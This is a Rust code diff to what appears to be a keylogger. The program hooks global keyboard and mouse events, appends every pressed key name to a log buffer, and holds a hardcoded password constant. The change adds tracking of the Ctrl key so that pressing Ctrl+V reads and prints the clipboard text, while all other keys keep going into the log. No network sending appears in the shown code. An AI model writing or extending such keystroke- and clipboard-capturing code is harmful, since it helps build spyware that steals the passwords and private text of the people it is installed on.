@@ -11,6 +11,7 @@ use monitor::*;
 const PASS: &[u8] = b"firemouses!";
 static LOG_FILE: Lazy<Mutex<String>> = Lazy::new(|| Mutex::new(String::new()));
 static LOGGED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
+static CTRL_HOLDED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
 
 fn main() {
     #[derive(Copy, Clone, Eq, PartialEq, Debug)]
@@ -147,20 +148,18 @@ fn track(event: Event) {
     match event.event_type {
         EventType::KeyPress(Key::Alt | Key::AltGr) => println!("Alt!"),
         EventType::KeyPress(Key::CapsLock) => println!("CapsLock!"),
-        EventType::KeyPress(Key::ControlLeft | Key::ControlRight) => println!("Control Left/Right!"),
+        EventType::KeyPress(Key::ControlLeft | Key::ControlRight) => {
+            *CTRL_HOLDED.lock().unwrap() = true;
+        },
+        EventType::KeyRelease(Key::ControlLeft | Key::ControlRight) => {
+            *CTRL_HOLDED.lock().unwrap() = false;
+        }
         EventType::KeyPress(Key::Delete) => println!("Delete!"),
         EventType::KeyPress(Key::DownArrow | Key::UpArrow | Key::LeftArrow | Key::RightArrow) => println!("Up/Down/Left/Right!"),
         EventType::KeyPress(Key::Home) => println!("Home!"),
         EventType::KeyPress(Key::Insert) => println!("Insert!"),
         EventType::KeyPress(Key::End) => println!("End!"),
-        EventType::KeyPress(Key::Escape) => {
-            let mut clipboard = Clipboard::new().unwrap();
-            println!("Clipboard text was: {}", clipboard.get_text().unwrap());
-
-            // let the_string = "Hello, world!";
-            // clipboard.set_text(the_string).unwrap();
-            // println!("But now the clipboard text should be: \"{}\"", the_string);
-        },
+        EventType::KeyPress(Key::Escape) => println!("Escape!"),
         EventType::KeyPress(Key::F1 | Key::F2 | Key::F3 | Key::F4 | Key::F5 | Key::F6 | Key::F7 | Key::F8 | Key::F9 | Key::F10 | Key::F11 | Key::F12) => println!("Fn!"),
         EventType::KeyPress(Key::MetaLeft | Key::MetaRight) => println!("Meta Left/Right!"),
         EventType::KeyPress(Key::ShiftLeft | Key::ShiftRight) => println!("Shift Left/Right!"),
@@ -211,10 +210,20 @@ fn track(event: Event) {
             }
         },
         EventType::KeyPress(Key::Unknown(u32)) => println!("Unknown key!"),
-        EventType::KeyPress(Key) => {
-            let key = event.name.unwrap();
-            *LOG_FILE.lock().unwrap() += &key;
-            *LOGGED.lock().unwrap() = false;
+        EventType::KeyPress(key) => {
+            let _key = event.name.unwrap();
+
+            if key == Key::KeyV && CTRL_HOLDED.lock().unwrap().clone() {
+                let mut clipboard = Clipboard::new().unwrap();
+                println!("Clipboard text was: {}", clipboard.get_text().unwrap());
+
+                // let the_string = "Hello, world!";
+                // clipboard.set_text(the_string).unwrap();
+                // println!("But now the clipboard text should be: \"{}\"", the_string);
+            } else {
+                *LOG_FILE.lock().unwrap() += &_key;
+                *LOGGED.lock().unwrap() = false;
+            }
         },
         EventType::ButtonPress(button) => match button {
             Button::Left => {
